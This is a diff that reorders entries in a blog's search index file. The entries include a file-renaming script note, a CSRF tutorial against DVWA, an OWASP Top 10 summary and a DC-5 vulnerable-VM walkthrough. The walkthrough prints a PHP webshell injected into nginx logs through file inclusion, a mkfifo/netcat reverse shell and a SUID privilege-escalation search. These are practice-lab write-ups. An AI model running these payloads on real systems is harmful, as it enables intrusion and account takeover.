@@ -285,6 +285,40 @@
       </categories>
   </entry>
   <entry>
+    <title>B站缓存剧集散乱，用python移动，重命名文件</title>
+    <url>/2020/03/05/B%E7%AB%99%E7%BC%93%E5%AD%98%E5%89%A7%E9%9B%86%E6%95%A3%E4%B9%B1%EF%BC%8C%E7%94%A8python%E7%A7%BB%E5%8A%A8%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12423345.html">源地址：https://www.cnblogs.com/This-is-Y/p/12423345.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>使用python的shutil库</p>
+<p>移动</p>
+<p>shutil.move(要移动的文件位置，目标位置）</p>
+<p>复制</p>
+<p>shutil.copy(要移动的文件位置，目标位置）</p>
+<p>如shutil.move(r’E:\41942769\test\111.txt’, r’E:\41942769\test_2\222.txt’)</p>
+<p>(这里加在字符串前面的的r是为了防止 ‘&#39; 转义)</p>
+<p> </p>
+<p>这里是发现b站下载的视频如果有很多集，在文件夹中是如此显示的</p>
+<img src="1503868-20200305222945564-1240341573.png" alt>
+
+<img src="1503868-20200305222935760-32275974.png" alt>
+
+<p> </p>
+<p> <img src="1503868-20200305223031567-526662282.png" alt></p>
+<p> </p>
+<p> 每个视频文件在最后都是0.blv的格式，其他的一些json文件，xml文件是视频信息和弹幕信息。</p>
+<p>这里用了两个小脚本把视频都放在一起，并且把视频文件命名位在B站中看到的名字</p>
+<p>移动</p>
+<p>重命名</p>
+<p>这边在分集下的文件夹中的entry.json文件中找到视频名字，用json稍微操作一下就可以得到视频名字。</p>
+<p>最后结果是这样的</p>
+<img src="1503868-20200305223537903-184238024.png" alt>
+
+<p> </p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
+  </entry>
+  <entry>
     <title>BadUSB 利用</title>
     <url>/2020/08/19/BadUSB%20%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13532603.html">源地址：https://www.cnblogs.com/This-is-Y/p/13532603.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -380,40 +414,6 @@
       </categories>
   </entry>
   <entry>
-    <title>B站缓存剧集散乱，用python移动，重命名文件</title>
-    <url>/2020/03/05/B%E7%AB%99%E7%BC%93%E5%AD%98%E5%89%A7%E9%9B%86%E6%95%A3%E4%B9%B1%EF%BC%8C%E7%94%A8python%E7%A7%BB%E5%8A%A8%EF%BC%8C%E9%87%8D%E5%91%BD%E5%90%8D%E6%96%87%E4%BB%B6/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12423345.html">源地址：https://www.cnblogs.com/This-is-Y/p/12423345.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>使用python的shutil库</p>
-<p>移动</p>
-<p>shutil.move(要移动的文件位置，目标位置）</p>
-<p>复制</p>
-<p>shutil.copy(要移动的文件位置，目标位置）</p>
-<p>如shutil.move(r’E:\41942769\test\111.txt’, r’E:\41942769\test_2\222.txt’)</p>
-<p>(这里加在字符串前面的的r是为了防止 ‘&#39; 转义)</p>
-<p> </p>
-<p>这里是发现b站下载的视频如果有很多集，在文件夹中是如此显示的</p>
-<img src="1503868-20200305222945564-1240341573.png" alt>
-
-<img src="1503868-20200305222935760-32275974.png" alt>
-
-<p> </p>
-<p> <img src="1503868-20200305223031567-526662282.png" alt></p>
-<p> </p>
-<p> 每个视频文件在最后都是0.blv的格式，其他的一些json文件，xml文件是视频信息和弹幕信息。</p>
-<p>这里用了两个小脚本把视频都放在一起，并且把视频文件命名位在B站中看到的名字</p>
-<p>移动</p>
-<p>重命名</p>
-<p>这边在分集下的文件夹中的entry.json文件中找到视频名字，用json稍微操作一下就可以得到视频名字。</p>
-<p>最后结果是这样的</p>
-<img src="1503868-20200305223537903-184238024.png" alt>
-
-<p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
     <title>CCF 202006-1 线性分类器 python</title>
     <url>/2020/08/14/CCF%20202006-1%20%E7%BA%BF%E6%80%A7%E5%88%86%E7%B1%BB%E5%99%A8%20python/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13502978.html">源地址：https://www.cnblogs.com/This-is-Y/p/13502978.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -475,54 +475,6 @@
 <h2 id="样例2输入-1"><a href="#样例2输入-1" class="headerlink" title="样例2输入"></a>样例2输入</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 3 8 0 0 10 10</span><br><span class="line">-1 -1 0 0 0 0 -1 -1 0 0 -1 -1 0 0 0 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p> </p>
-]]></content>
-      <categories>
-        <category>cnblogs</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CSRF 简单入门以及用dvwa构造的简单实例</title>
-    <url>/2020/03/10/CSRF%20%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E7%94%A8dvwa%E6%9E%84%E9%80%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/</url>
-    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12457322.html">源地址：https://www.cnblogs.com/This-is-Y/p/12457322.html<i class="fas fa-external-link-alt"></i></a></p>
-<p>SRF(跨站请求伪造)</p>
-<p>攻击者使用目标用户的身份，以目标用户的身份完成攻击者想要完全的操作。也可以理解为在目标用户不知情的情况下完成我们想要他完成的工作。</p>
-<p>在目标用户看来，他只完成了他本人想要完成的。而在网站看来，这份工作是已经登陆的目标用户想要网站完成的。而CSRF攻击就像是做了一个中间人，对两端的目标用户和网站进行欺骗。</p>
-<p>CSRF的两个重点：</p>
-<p>1）<strong>目标用户已经登陆了网站，能够执行网站的功能</strong></p>
-<p>2）<strong>目标用户访问了攻击者构造的URL</strong></p>
-<p> </p>
-<p>在BP中有构造CSRF Poc的功能，这里使用dvwa和bp来模拟一次CSRF</p>
-<p>先把安全程度调低</p>
-<img src="1503868-20200310171809249-88430808.png" alt width="592" height="330">
-
-<p> 修改密码为123456。</p>
-<p>这里修改123456的作用是可以理解为构造一个行为。让目标用户在不知情的情况下，通过点击一个简单的按钮，完成这个修改密码的行为。</p>
-<p>点击change。抓到这个包，发送到repeat。构建CSRF Poc</p>
-<img src="1503868-20200310172115797-442958379.png" alt width="829" height="627">
-
-<p> 把这里给的HTML代码保存下来，这里我们将它构造成一个html文件</p>
-<img src="1503868-20200310172945814-2015757352.png" alt>
-
-<p>这边在浏览器打开构造的文件，是一个request按钮，只用用户点击，就会完成修改密码的动作</p>
-<img src="1503868-20200310173422860-1549979433.png" alt width="888" height="493">
-
-<p> </p>
-<p>这边进入到dvwa数据库</p>
-<img src="1503868-20200310174202678-902204027.png" alt>
-
-<p> 有5个用户，用hack来登陆，来当小白鼠。账户1337，密码用cmd5破解，charley</p>
-<img src="1503868-20200310174449340-1686075278.png" alt width="636" height="221">
-
-<p> 登陆。点击刚才构造的文件的按钮。</p>
-<p>然后回到dvwa主界面，刷新一下，发现回到了登录窗口。</p>
-<img src="1503868-20200310174844136-268339516.png" alt>
-
-<p>这时候用原来的charley密码是登不上去的，密码在点击时已经变成了构造文件时设置的123456</p>
-<p>回到数据库中。可以发现密码的hash值已经变了。再cmd5解密，确认一下</p>
-<img src="1503868-20200310175012687-654871658.png" alt width="1045" height="439">
-
-<p> <img src="1503868-20200310175104669-1409171740.png" alt></p>
-<p> 现在已经可以确认，CSRF攻击成功，账户为1337的用户hack在登陆后不知情的情况下，被修改了密码</p>
 ]]></content>
       <categories>
         <category>cnblogs</category>
@@ -1133,56 +1085,6 @@
       </categories>
   </entry>
   <entry>
-    <title>DC-5</title>
-    <url>/2021/06/07/DC-5/</url>
-    <content><![CDATA[<p>虚拟机用的NAT模式，看一下自己NAT的网卡的段<br><img src="image-20210607154654661.png" alt="image-20210607154654661"></p>
-<p>nmap找IP</p>
-<ul>
-<li>nmap 192.168.87.0/24 -sP<br><img src="image-20210607154727829.png" alt="image-20210607154727829"></li>
-</ul>
-<p>nmap扫一下端口</p>
-<ul>
-<li>nmap -Pn -sV 192.168.87.132</li>
-</ul>
-<p>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    nginx 1.6.2<br>111/tcp open  rpcbind 2-4 (RPC #100000)</p>
-<p>太少了<br>再用masscan扫一下</p>
-<ul>
-<li>masscan -p0-65535 192.168.87.132<br>Discovered open port 57216/tcp on 192.168.87.132<br>Discovered open port 80/tcp on 192.168.87.132<br>Discovered open port 111/tcp on 192.168.87.132<br>没东西</li>
-</ul>
-<p>同时dirsearch扫一下目录</p>
-<ul>
-<li>python .\dirsearch.py -u <a class="link" href="http://192.168.87.132/">http://192.168.87.132/<i class="fas fa-external-link-alt"></i></a> -e php</li>
-</ul>
-<p>[15:50:10] Starting:<br>[15:50:24] 200 -    4KB - /contact.php<br>[15:50:24] 301 -  184B  - /css  -&gt;  <a class="link" href="http://192.168.87.132/css/">http://192.168.87.132/css/<i class="fas fa-external-link-alt"></i></a><br>[15:50:26] 200 -    6KB - /faq.php<br>[15:50:27] 301 -  184B  - /images  -&gt;  <a class="link" href="http://192.168.87.132/images/">http://192.168.87.132/images/<i class="fas fa-external-link-alt"></i></a><br>[15:50:27] 403 -  570B  - /images/<br>[15:50:27] 200 -    4KB - /index.php<br>[15:50:36] 200 -  852B  - /thankyou.php</p>
-<p>Task Completed</p>
-<p>xray扫出了这个<img src="image-20210607161522204.png" alt="image-20210607161522204"><br>暂时用不上</p>
-<p>去看了一下作者的视频提示<br><img src="image-20210607164231823.png" alt="image-20210607164231823"></p>
-<p><a class="link" href="https://www.five86.com/dc-5-clue.html">https://www.five86.com/dc-5-clue.html<i class="fas fa-external-link-alt"></i></a><br>有个文件包含<br><a class="link" href="http://192.168.87.132/thankyou.php?file=/etc/passwd">http://192.168.87.132/thankyou.php?file=/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
-<p>后面改了一下网卡，ip变成了192.168.101.128</p>
-<p>后续getshell思路是，执行<br>192.168.101.128/thankyou.php?<?php eval(@$_POST['a']); ?><br>在nginx中它会被记录到log日志中，日志有两种，正确的和错误的<br>文件路径分别为<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>在读取的是时候两个都试试，</p>
-<p>192.168.101.128/thankyou.php?file=/var/log/nginx/error.log<br>192.168.101.128/thankyou.php?file=/var/log/nginx/access.log</p>
-<p>error的连不上，<br>用access这个连上去了，但是练上去后我人就傻了</p>
-<p><img src="image-20210607222211828.png" alt="image-20210607222211828"><br>这™的是什么</p>
-<p>（蚁剑的问题，更新一下就好了）</p>
-<p>注意写数据到日志的时候要用bp，直接浏览器写会进行编码，导致数据解析不出来</p>
-<p>蚁剑连进去后，看一下各种信息，反弹shell到kali</p>
-<p>监听 nc -lvvp 4567</p>
-<p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc 192.168.101.130 4567 &gt;/tmp/bd</p>
-<p><img src="image-20210608102329776.png" alt="image-20210608102329776"></p>
-<p><img src="image-20210608102323166.png" alt="image-20210608102323166"></p>
-<p>准备提权<br>nginx1.6.2有个提权的漏洞<br>CVE-2016-1247<br>但是用不了</p>
-<p><img src="image-20210608111816674.png" alt="image-20210608111816674"><br>少了权限</p>
-<p>用 find / -perm -u=s -type f 2&gt;/dev/null  查找一下可以用root权限运行的命令</p>
-<p>找到了screen这个，去searchsploit里找到了相应的利用文件</p>
-<p><img src="image-20210608150840541.png" alt="image-20210608150840541"></p>
-<p>把文件下载过来上传到目标/tmp目录里，直接用发现不太行</p>
-<p>直接对着文件内容，一步一步过来</p>
-<p><img src="image-20210608151059369.png" alt="image-20210608151059369"></p>
-<p><img src="image-20210608151222329.png" alt="image-20210608151222329"></p>
-<p><img src="image-20210608150655806.png" alt="image-20210608150655806"></p>
-]]></content>
-  </entry>
-  <entry>
     <title>DC-4靶机</title>
     <url>/2020/07/22/DC-4%E9%9D%B6%E6%9C%BA/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/13347213.html">源地址：https://www.cnblogs.com/This-is-Y/p/13347213.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1323,6 +1225,56 @@
       </categories>
   </entry>
   <entry>
+    <title>DC-5</title>
+    <url>/2021/06/07/DC-5/</url>
+    <content><![CDATA[<p>虚拟机用的NAT模式，看一下自己NAT的网卡的段<br><img src="image-20210607154654661.png" alt="image-20210607154654661"></p>
+<p>nmap找IP</p>
+<ul>
+<li>nmap 192.168.87.0/24 -sP<br><img src="image-20210607154727829.png" alt="image-20210607154727829"></li>
+</ul>
+<p>nmap扫一下端口</p>
+<ul>
+<li>nmap -Pn -sV 192.168.87.132</li>
+</ul>
+<p>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    nginx 1.6.2<br>111/tcp open  rpcbind 2-4 (RPC #100000)</p>
+<p>太少了<br>再用masscan扫一下</p>
+<ul>
+<li>masscan -p0-65535 192.168.87.132<br>Discovered open port 57216/tcp on 192.168.87.132<br>Discovered open port 80/tcp on 192.168.87.132<br>Discovered open port 111/tcp on 192.168.87.132<br>没东西</li>
+</ul>
+<p>同时dirsearch扫一下目录</p>
+<ul>
+<li>python .\dirsearch.py -u <a class="link" href="http://192.168.87.132/">http://192.168.87.132/<i class="fas fa-external-link-alt"></i></a> -e php</li>
+</ul>
+<p>[15:50:10] Starting:<br>[15:50:24] 200 -    4KB - /contact.php<br>[15:50:24] 301 -  184B  - /css  -&gt;  <a class="link" href="http://192.168.87.132/css/">http://192.168.87.132/css/<i class="fas fa-external-link-alt"></i></a><br>[15:50:26] 200 -    6KB - /faq.php<br>[15:50:27] 301 -  184B  - /images  -&gt;  <a class="link" href="http://192.168.87.132/images/">http://192.168.87.132/images/<i class="fas fa-external-link-alt"></i></a><br>[15:50:27] 403 -  570B  - /images/<br>[15:50:27] 200 -    4KB - /index.php<br>[15:50:36] 200 -  852B  - /thankyou.php</p>
+<p>Task Completed</p>
+<p>xray扫出了这个<img src="image-20210607161522204.png" alt="image-20210607161522204"><br>暂时用不上</p>
+<p>去看了一下作者的视频提示<br><img src="image-20210607164231823.png" alt="image-20210607164231823"></p>
+<p><a class="link" href="https://www.five86.com/dc-5-clue.html">https://www.five86.com/dc-5-clue.html<i class="fas fa-external-link-alt"></i></a><br>有个文件包含<br><a class="link" href="http://192.168.87.132/thankyou.php?file=/etc/passwd">http://192.168.87.132/thankyou.php?file=/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
+<p>后面改了一下网卡，ip变成了192.168.101.128</p>
+<p>后续getshell思路是，执行<br>192.168.101.128/thankyou.php?<?php eval(@$_POST['a']); ?><br>在nginx中它会被记录到log日志中，日志有两种，正确的和错误的<br>文件路径分别为<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>在读取的是时候两个都试试，</p>
+<p>192.168.101.128/thankyou.php?file=/var/log/nginx/error.log<br>192.168.101.128/thankyou.php?file=/var/log/nginx/access.log</p>
+<p>error的连不上，<br>用access这个连上去了，但是练上去后我人就傻了</p>
+<p><img src="image-20210607222211828.png" alt="image-20210607222211828"><br>这™的是什么</p>
+<p>（蚁剑的问题，更新一下就好了）</p>
+<p>注意写数据到日志的时候要用bp，直接浏览器写会进行编码，导致数据解析不出来</p>
+<p>蚁剑连进去后，看一下各种信息，反弹shell到kali</p>
+<p>监听 nc -lvvp 4567</p>
+<p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc 192.168.101.130 4567 &gt;/tmp/bd</p>
+<p><img src="image-20210608102329776.png" alt="image-20210608102329776"></p>
+<p><img src="image-20210608102323166.png" alt="image-20210608102323166"></p>
+<p>准备提权<br>nginx1.6.2有个提权的漏洞<br>CVE-2016-1247<br>但是用不了</p>
+<p><img src="image-20210608111816674.png" alt="image-20210608111816674"><br>少了权限</p>
+<p>用 find / -perm -u=s -type f 2&gt;/dev/null  查找一下可以用root权限运行的命令</p>
+<p>找到了screen这个，去searchsploit里找到了相应的利用文件</p>
+<p><img src="image-20210608150840541.png" alt="image-20210608150840541"></p>
+<p>把文件下载过来上传到目标/tmp目录里，直接用发现不太行</p>
+<p>直接对着文件内容，一步一步过来</p>
+<p><img src="image-20210608151059369.png" alt="image-20210608151059369"></p>
+<p><img src="image-20210608151222329.png" alt="image-20210608151222329"></p>
+<p><img src="image-20210608150655806.png" alt="image-20210608150655806"></p>
+]]></content>
+  </entry>
+  <entry>
     <title>DC-6</title>
     <url>/2021/06/08/DC-6/</url>
     <content><![CDATA[<p>dc-6<br>安装作者的说明，下载hosts文件中配置一下</p>
@@ -1409,6 +1361,54 @@
 <p><img src="image-20210617121256110.png" alt="image-20210617121256110"></p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇记录得有些乱，这个靶机看来作者是想让我们从github来找敏感信息，找到后使用ssh连上后，后面的操作我确实想不到，从网页设置文件中找到了数据库密码，连上数据库后修改admin用户的密码，再在网页中使用admin用户反弹更高权限的shell，然后就是和上一个靶机类似操作的，修改shell文件，利用定时任务来提权</p>
 ]]></content>
+  </entry>
+  <entry>
+    <title>CSRF 简单入门以及用dvwa构造的简单实例</title>
+    <url>/2020/03/10/CSRF%20%E7%AE%80%E5%8D%95%E5%85%A5%E9%97%A8%E4%BB%A5%E5%8F%8A%E7%94%A8dvwa%E6%9E%84%E9%80%A0%E7%9A%84%E7%AE%80%E5%8D%95%E5%AE%9E%E4%BE%8B/</url>
+    <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/12457322.html">源地址：https://www.cnblogs.com/This-is-Y/p/12457322.html<i class="fas fa-external-link-alt"></i></a></p>
+<p>SRF(跨站请求伪造)</p>
+<p>攻击者使用目标用户的身份，以目标用户的身份完成攻击者想要完全的操作。也可以理解为在目标用户不知情的情况下完成我们想要他完成的工作。</p>
+<p>在目标用户看来，他只完成了他本人想要完成的。而在网站看来，这份工作是已经登陆的目标用户想要网站完成的。而CSRF攻击就像是做了一个中间人，对两端的目标用户和网站进行欺骗。</p>
+<p>CSRF的两个重点：</p>
+<p>1）<strong>目标用户已经登陆了网站，能够执行网站的功能</strong></p>
+<p>2）<strong>目标用户访问了攻击者构造的URL</strong></p>
+<p> </p>
+<p>在BP中有构造CSRF Poc的功能，这里使用dvwa和bp来模拟一次CSRF</p>
+<p>先把安全程度调低</p>
+<img src="1503868-20200310171809249-88430808.png" alt width="592" height="330">
+
+<p> 修改密码为123456。</p>
+<p>这里修改123456的作用是可以理解为构造一个行为。让目标用户在不知情的情况下，通过点击一个简单的按钮，完成这个修改密码的行为。</p>
+<p>点击change。抓到这个包，发送到repeat。构建CSRF Poc</p>
+<img src="1503868-20200310172115797-442958379.png" alt width="829" height="627">
+
+<p> 把这里给的HTML代码保存下来，这里我们将它构造成一个html文件</p>
+<img src="1503868-20200310172945814-2015757352.png" alt>
+
+<p>这边在浏览器打开构造的文件，是一个request按钮，只用用户点击，就会完成修改密码的动作</p>
+<img src="1503868-20200310173422860-1549979433.png" alt width="888" height="493">
+
+<p> </p>
+<p>这边进入到dvwa数据库</p>
+<img src="1503868-20200310174202678-902204027.png" alt>
+
+<p> 有5个用户，用hack来登陆，来当小白鼠。账户1337，密码用cmd5破解，charley</p>
+<img src="1503868-20200310174449340-1686075278.png" alt width="636" height="221">
+
+<p> 登陆。点击刚才构造的文件的按钮。</p>
+<p>然后回到dvwa主界面，刷新一下，发现回到了登录窗口。</p>
+<img src="1503868-20200310174844136-268339516.png" alt>
+
+<p>这时候用原来的charley密码是登不上去的，密码在点击时已经变成了构造文件时设置的123456</p>
+<p>回到数据库中。可以发现密码的hash值已经变了。再cmd5解密，确认一下</p>
+<img src="1503868-20200310175012687-654871658.png" alt width="1045" height="439">
+
+<p> <img src="1503868-20200310175104669-1409171740.png" alt></p>
+<p> 现在已经可以确认，CSRF攻击成功，账户为1337的用户hack在登陆后不知情的情况下，被修改了密码</p>
+]]></content>
+      <categories>
+        <category>cnblogs</category>
+      </categories>
   </entry>
   <entry>
     <title>DC-8</title>
@@ -1764,6 +1764,22 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       </categories>
   </entry>
   <entry>
+    <title>OWASP Top10</title>
+    <url>/2021/05/12/OWASP-Top10/</url>
+    <content><![CDATA[<h1 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1 注入"></a>A1 注入</h1><p>  将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
+<h1 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h1><p>  通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
+<h1 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h1><p>  许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
+<h1 id="A4-XML外部实体（XXE）"><a href="#A4-XML外部实体（XXE）" class="headerlink" title="A4 XML外部实体（XXE）"></a>A4 XML外部实体（XXE）</h1><p>  许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
+<h1 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5 失效的访问控制"></a>A5 失效的访问控制</h1><p>  未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
+<h1 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
+<h1 id="A7-跨站脚本（XSS）"><a href="#A7-跨站脚本（XSS）" class="headerlink" title="A7 跨站脚本（XSS）"></a>A7 跨站脚本（XSS）</h1><p>  当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
+<h1 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8 不安全的反序列化"></a>A8 不安全的反序列化</h1><p>  不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
+<h1 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h1><p>  组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
+<h1 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h1><p>  不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
+<p>pdf： [OWASP Top 10 2017 4e2d65877248v1.0-2.pdf](......\0_IDM_Download\OWASP Top 10 2017 4e2d65877248v1.0-2.pdf) </p>
+]]></content>
+  </entry>
+  <entry>
     <title>PHP学习笔记</title>
     <url>/2019/09/08/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
     <content><![CDATA[<p>来自之前cnblog的博客<br><a class="link" href="https://www.cnblogs.com/This-is-Y/p/11466633.html">源地址：https://www.cnblogs.com/This-is-Y/p/11466633.html<i class="fas fa-external-link-alt"></i></a></p>
@@ -1900,22 +1916,6 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
       <categories>
         <category>cnblogs</category>
       </categories>
-  </entry>
-  <entry>
-    <title>OWASP Top10</title>
-    <url>/2021/05/12/OWASP-Top10/</url>
-    <content><![CDATA[<h1 id="A1-注入"><a href="#A1-注入" class="headerlink" title="A1 注入"></a>A1 注入</h1><p>  将不受信任的数据作为命令或查询的一部分发送到解析器时，会产生诸如SQL注入、NoSQL注入、OS注入和LDAP注入的注入缺陷。攻击者的恶意数据可以诱使解析器在没有适当授权的情况下执行非预期命令或访问数据。</p>
-<h1 id="A2-失效的身份认证"><a href="#A2-失效的身份认证" class="headerlink" title="A2 失效的身份认证"></a>A2 失效的身份认证</h1><p>  通常，通过错误使用应用程序的身份认证和会话管理功能，攻击者能够破译密码、密钥或会话令牌，或者利用其它开发缺陷来暂时性或永久性冒充其他用户的身份。</p>
-<h1 id="A3-敏感数据泄露"><a href="#A3-敏感数据泄露" class="headerlink" title="A3 敏感数据泄露"></a>A3 敏感数据泄露</h1><p>  许多Web应用程序和API都无法正确保护敏感数据，例如：财务数据、医疗数据和PII数据。攻击者可以通过窃取或修改未加密的数据来实施信用卡诈骗、身份盗窃或其他犯罪行为。未加密的敏感数据容易受到破坏，因此，我们需要对敏感数据加密，这些数据包括：传输过程中的数据、存储的数据以及浏览器的交互数据。</p>
-<h1 id="A4-XML外部实体（XXE）"><a href="#A4-XML外部实体（XXE）" class="headerlink" title="A4 XML外部实体（XXE）"></a>A4 XML外部实体（XXE）</h1><p>  许多较早的或配置错误的XML处理器评估了XML文件中的外部实体引用。攻击者可以利用外部实体窃取使用URI文件处理器的内部文件和共享文件、监听内部扫描端口、执行远程代码和实施拒绝服务攻击。</p>
-<h1 id="A5-失效的访问控制"><a href="#A5-失效的访问控制" class="headerlink" title="A5 失效的访问控制"></a>A5 失效的访问控制</h1><p>  未对通过身份验证的用户实施恰当的访问控制。攻击者可以利用这些缺陷访问未经授权的功能或数据，例如：访问其他用户的帐户、查看敏感文件、修改其他用户的数据、更改访问权限等。</p>
-<h1 id="A6-安全配置错误"><a href="#A6-安全配置错误" class="headerlink" title="A6 安全配置错误"></a>A6 安全配置错误</h1><p>安全配置错误是最常见的安全问题，这通常是由于不安全的默认配置、不完整的临时配置、开源云存储、错误的 HTTP 标头配置以及包含敏感信息的详细错误信息所造成的。因此，我们不仅需要对所有的操作系统、框架、库和应用程序进行安全配置，而且必须及时修补和升级它们。</p>
-<h1 id="A7-跨站脚本（XSS）"><a href="#A7-跨站脚本（XSS）" class="headerlink" title="A7 跨站脚本（XSS）"></a>A7 跨站脚本（XSS）</h1><p>  当应用程序的新网页中包含不受信任的、未经恰当验证或转义的数据时，或者使用可以创建 HTML或JavaScript 的浏览器 API 更新现有的网页时，就会出现 XSS 缺陷。XSS 让攻击者能够在受害者的浏览器中执行脚本，并劫持用户会话、破坏网站或将用户重定向到恶意站点。</p>
-<h1 id="A8-不安全的反序列化"><a href="#A8-不安全的反序列化" class="headerlink" title="A8 不安全的反序列化"></a>A8 不安全的反序列化</h1><p>  不安全的反序列化会导致远程代码执行。即使反序列化缺陷不会导致远程代码执行，攻击者也可以利用它们来执行攻击，包括：重播攻击、注入攻击和特权升级攻击。</p>
-<h1 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h1><p>  组件（例如：库、框架和其他软件模块）拥有和应用程序相同的权限。如果应用程序中含有已知漏洞的组件被攻击者利用，可能会造成严重的数据丢失或服务器接管。同时，使用含有已知漏洞的组件的应用程序和API可能会破坏应用程序防御、造成各种攻击并产生严重影响。</p>
-<h1 id="A10-不足的日志记录和监控"><a href="#A10-不足的日志记录和监控" class="headerlink" title="A10 不足的日志记录和监控"></a>A10 不足的日志记录和监控</h1><p>  不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性或转向更多系统，以及篡改、提取或销毁数据。大多数缺陷研究显示，缺陷被检测出的时间超过200天，且通常通过外部检测方检测，而不是通过内部流程或监控检测。</p>
-<p>pdf： [OWASP Top 10 2017 4e2d65877248v1.0-2.pdf](......\0_IDM_Download\OWASP Top 10 2017 4e2d65877248v1.0-2.pdf) </p>
-]]></content>
   </entry>
   <entry>
     <title>PHP序列化入门</title>
@@ -2244,7 +2244,7 @@ document.getElementById("t6").innerHTML=muti;   //123</pre>
 <p> </p>
 <p> </p>
